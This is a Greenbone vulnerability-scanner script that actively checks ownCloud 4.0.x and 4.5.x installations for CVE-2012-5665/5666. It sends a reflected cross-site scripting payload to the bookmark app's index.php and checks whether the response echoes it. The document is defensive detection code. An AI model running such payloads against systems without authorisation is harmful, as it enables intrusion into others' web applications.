# SPDX-FileCopyrightText: 2013 Greenbone AG
# Some text descriptions might be excerpted from (a) referenced
# source(s), and are Copyright (C) by the respective right holder(s).
#
# SPDX-License-Identifier: GPL-2.0-only

CPE = "cpe:/a:owncloud:owncloud";

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.803742");
  script_version("2023-12-01T16:11:30+0000");
  script_cve_id("CVE-2012-5665", "CVE-2012-5666");
  script_tag(name:"cvss_base", value:"4.3");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:M/Au:N/C:N/I:P/A:N");
  script_tag(name:"last_modification", value:"2023-12-01 16:11:30 +0000 (Fri, 01 Dec 2023)");
  script_tag(name:"creation_date", value:"2013-08-21 18:01:53 +0530 (Wed, 21 Aug 2013)");
  script_name("ownCloud 4.0.x < 4.0.10, 4.5.x < 4.5.5 Multiple Vulnerabilities - Active Check");
  script_category(ACT_ATTACK);
  script_copyright("Copyright (C) 2013 Greenbone AG");
  script_family("Web application abuses");
  script_dependencies("gb_owncloud_http_detect.nasl");
  script_mandatory_keys("owncloud/http/detected");
  script_require_ports("Services/www", 443);

  script_xref(name:"URL", value:"http://owncloud.org/changelog");
  script_xref(name:"URL", value:"http://www.securityfocus.com/bid/57030");
  script_xref(name:"URL", value:"http://secunia.com/advisories/51614");
  script_xref(name:"URL", value:"http://www.openwall.com/lists/oss-security/2012/12/22/2");
  script_xref(name:"URL", value:"http://www.openwall.com/lists/oss-security/2012/12/22/5");
  script_xref(name:"URL", value:"https://github.com/owncloud/apps/commit/eafa9b2#diff-0");

  script_tag(name:"summary", value:"ownCloud is prone to cross-site scripting (XSS) and security
  bypass vulnerabilities.");

  script_tag(name:"vuldetect", value:"Sends a crafted HTTP GET request and checks the response.");

  script_tag(name:"insight", value:"Multiple flaws are due to:

  - The application not verifying permissions when accessing settings.php
  can be exploited to change the app configuration for user_webdavauth
  and user_ldap and subsequently login as arbitrary users.

  - Certain input passed to apps/bookmark/index.php is not properly sanitised
  before being returned to the user.");

  script_tag(name:"impact", value:"Successful exploitation will allow remote attacker to execute
  arbitrary HTML or script code or discloses sensitive information resulting in loss of
  confidentiality.");

  script_tag(name:"affected", value:"ownCloud versions 4.0.x prior to 4.0.10 and 4.5.x prior to
  4.5.5.");

  script_tag(name:"solution", value:"Update to version 4.0.10, 4.5.5 or later.");

  script_tag(name:"solution_type", value:"VendorFix");
  script_tag(name:"qod_type", value:"remote_analysis");

  exit(0);
}

include("http_func.inc");
include("host_details.inc");
include("http_keepalive.inc");

if(!port = get_app_port(cpe:CPE, service:"www"))
  exit(0);

if(!dir = get_app_location(cpe:CPE, port:port))
  exit(0);

if(dir == "/")
  dir = "";

url = dir + "/apps/bookmark/index.php?PATH_INFO='><script>alert(document.cookie);</script>";

if(http_vuln_check(port:port, url:url, pattern:"><script>alert\(document\.cookie\)</script>", check_header:TRUE)) {
  report = http_report_vuln_url(port:port, url:url);
  security_message(port:port, data:report);
  exit(0);
}

exit(99);
